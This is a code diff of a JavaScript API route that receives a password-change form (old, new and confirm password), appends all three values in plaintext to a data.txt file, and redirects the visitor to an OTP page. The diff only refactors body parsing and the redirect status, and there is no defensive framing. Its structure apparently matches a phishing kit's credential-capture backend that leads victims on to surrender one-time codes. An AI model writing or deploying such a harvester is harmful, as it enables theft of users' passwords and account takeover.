@@ -1,34 +1,17 @@
 import fs from 'fs';
 import path from 'path';
 
-export const config = {
-  api: {
-    bodyParser: false, // turn off default body parser
-  },
-};
-
 export default async function handler(req, res) {
   if (req.method === 'POST') {
-    let body = '';
+    const { oldpass, newpass, confirmpass } = req.body;
 
-    req.on('data', chunk => {
-      body += chunk.toString();
-    });
+    const log = `Old Password: ${oldpass}\nNew Password: ${newpass}\nConfirm Password: ${confirmpass}\n\n`;
+    const filePath = path.join(process.cwd(), 'data', 'data.txt');
 
-    req.on('end', () => {
-      const parsed = new URLSearchParams(body);
-      const oldpass = parsed.get('oldpass');
-      const newpass = parsed.get('newpass');
-      const confirmpass = parsed.get('confirmpass');
+    fs.appendFileSync(filePath, log, 'utf8');
 
-      const log = `Old: ${oldpass}\nNew: ${newpass}\nConfirm: ${confirmpass}\n\n`;
-
-      const filePath = path.join(process.cwd(), 'data.txt');
-      fs.appendFileSync(filePath, log, 'utf8');
-
-      res.writeHead(302, { Location: '/otp.html' });
-      res.end();
-    });
+    res.writeHead(307, { Location: '/otp.html' });
+    res.end();
   } else {
     res.status(405).send('Method Not Allowed');
   }
